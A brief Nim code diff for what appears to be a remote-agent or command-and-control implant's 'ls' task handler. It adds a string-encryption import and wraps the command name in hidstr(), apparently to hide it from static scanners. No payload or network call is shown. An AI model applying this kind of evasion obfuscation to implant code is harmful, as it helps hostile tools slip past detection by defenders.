@@ -1,6 +1,7 @@
 import std/[os, json, strutils, times]
 import core/types, core/utils
 import commands/registry
+import crypto/strenc
 
 proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
                send: SendMsg): TaskResult =
@@ -63,4 +64,4 @@ proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initLs*() =
-  register("ls", lsExecute)
+  register(hidstr("ls"), lsExecute)
